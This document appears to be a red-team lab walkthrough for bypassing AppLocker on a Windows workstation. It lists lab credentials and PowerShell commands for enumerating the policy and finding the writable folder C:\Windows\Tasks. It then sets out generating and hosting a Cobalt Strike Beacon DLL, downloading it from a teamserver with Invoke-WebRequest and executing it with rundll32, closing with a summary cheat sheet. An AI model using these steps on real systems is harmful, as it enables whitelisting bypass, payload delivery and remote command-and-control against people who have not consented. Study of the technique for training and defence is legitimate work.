# AppLocker Challenge

**Objective:** Bypass AppLocker and execute a Beacon on the target workstation.

| Host | Credentials |
|------|-------------|
| `lon-wkstn-1` | `CONTOSO\pchilds` / `Passw0rd!` |
| `lon-dc-1` | `CONTOSO\Administrator` / `Passw0rd!` |

---

## Step 1 — Enumerate AppLocker Policy on lon-wkstn-1

```powershell
# Confirm AppLocker is enforcing (ConstrainedLanguage = active)
$ExecutionContext.SessionState.LanguageMode

# Read all effective rules
$policy = Get-AppLockerPolicy -Effective
$policy.RuleCollections

# Check if DLL rules are enforced — empty output = DLL rules OFF = rundll32 viable
$policy.RuleCollections | Where-Object { $_.RuleCollectionType -eq 'Dll' }

# Find writable dirs inside the allowed %WINDIR%\* path
icacls C:\Windows\Tasks
icacls C:\Windows\Temp
```

**Key findings on lon-wkstn-1:**

| Check | Result |
|-------|--------|
| Language mode | `ConstrainedLanguage` — AppLocker enforcing |
| DLL rules | **Empty** — DLL enforcement OFF |
| `C:\Windows\Tasks` | `Authenticated Users:(RX,WD)` — **writable** |
| `C:\Windows\Temp` | Access denied for pchilds |
| Rules in place | Default only — `%WINDIR%\*` and `%PROGRAMFILES%\*` for Everyone |

**Bypass path: `rundll32` loading a DLL dropped into `C:\Windows\Tasks`**
- `rundll32.exe` lives in `%WINDIR%\System32\` — covered by the `%WINDIR%\*` allow rule
- DLL rules are off — the DLL payload itself is not checked by AppLocker

<img src="/images/applocker-challenge01.png" width=860>

---

## Step 2 — Generate Stageless Beacon DLL (Attacker Desktop — CS)

```
Cobalt Strike > Payloads > Windows Stageless Payload
  Listener:  http
  Output:    Windows DLL (x64)
  Save as:   C:\Payloads\beacon.dll
```

---

## Step 3 — Host Payload via CS Web Server

```
Site Management > Host File
  File:   beacon.dll
  URI:    /beacon.dll
  Port:   80
```

CS confirms: 

```
04/21 08:09:23 *** neo hosted file /cobaltstrike/server/uploads/beacon.dll @ http://172.16.0.10:80/beacon.dll
04/21 08:10:29 *** initial beacon from pchilds@10.10.121.108 (LON-WKSTN-1)
```  


---

## Step 4 — Download Beacon DLL to lon-wkstn-1

On `lon-wkstn-1` as `pchilds` — `Invoke-WebRequest` works in ConstrainedLanguage:

```powershell
Invoke-WebRequest -Uri 'http://10.0.0.5:80/beacon.dll' -OutFile 'C:\Windows\Tasks\beacon.dll'
```

---

## Step 5 — Execute via rundll32

```cmd
rundll32.exe C:\Windows\Tasks\beacon.dll,StartW
```

> **OPSEC-🟠CAUTION:** `rundll32` is EDR-visible. Beacon DLL exports `StartW` specifically for this call. Ensure `spawnto` is set in the malleable profile before generating the payload.

---

## Step 6 — Catch Beacon in CS

```
View > Beacons
```

Beacon checks in as `CONTOSO\pchilds` on `LON-WKSTN-1`, process `rundll32.exe`, arch `x64`.

Verify:

```cs
beacon> getuid
// [*] You are CONTOSO\pchilds

beacon> pwd
// [*] Current directory is C:\Windows\Tasks
```

<img src="/images/applocker-challenge02.png" width=860>

---

## Summary

```
CONFIRM CLM:   $ExecutionContext.SessionState.LanguageMode  → ConstrainedLanguage
DLL RULES OFF: $policy.RuleCollections | ? {$_.RuleCollectionType -eq 'Dll'}  → empty
WRITABLE PATH: icacls C:\Windows\Tasks  → Authenticated Users:(RX,WD)
DOWNLOAD:      Invoke-WebRequest -Uri 'http://<teamserver>/beacon.dll' -OutFile 'C:\Windows\Tasks\beacon.dll'
EXECUTE:       rundll32.exe C:\Windows\Tasks\beacon.dll,StartW
```
